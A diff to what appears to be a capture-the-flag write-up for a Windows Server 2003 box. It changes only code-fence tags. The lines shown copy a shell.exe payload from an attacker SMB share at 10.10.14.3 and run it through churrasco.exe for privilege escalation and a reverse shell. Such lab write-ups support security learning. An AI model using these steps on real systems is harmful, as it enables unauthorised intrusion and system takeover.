@@ -142,7 +142,7 @@ It seems like its running on `Windows Server 2003` which is vulnerable to `MS09-
 
 Now, we need to create a `temp` directory in `C:\` to have writeable privileges. Then, we can copy the file over the SMB server we created.
 
-```cmd
+```
 c:\windows\system32\inetsrv>cd C:\
 C:\>mkdir temp
 C:\>cd temp
@@ -189,14 +189,14 @@ The exploit works, but only for 1 single command. We can bypass this by creating
 ...
 ```
 
-```cmd
+```
 C:\temp>copy \\10.10.14.3\KALI\shell.exe .
         1 file(s) copied.
 ```
 
 Now, we can start yet another listener on our machine and execute the `shell.exe` using `churrasco.exe`!
 
-```cmd
+```
 C:\temp>churrasco.exe "C:\temp\shell.exe"
 ```
 
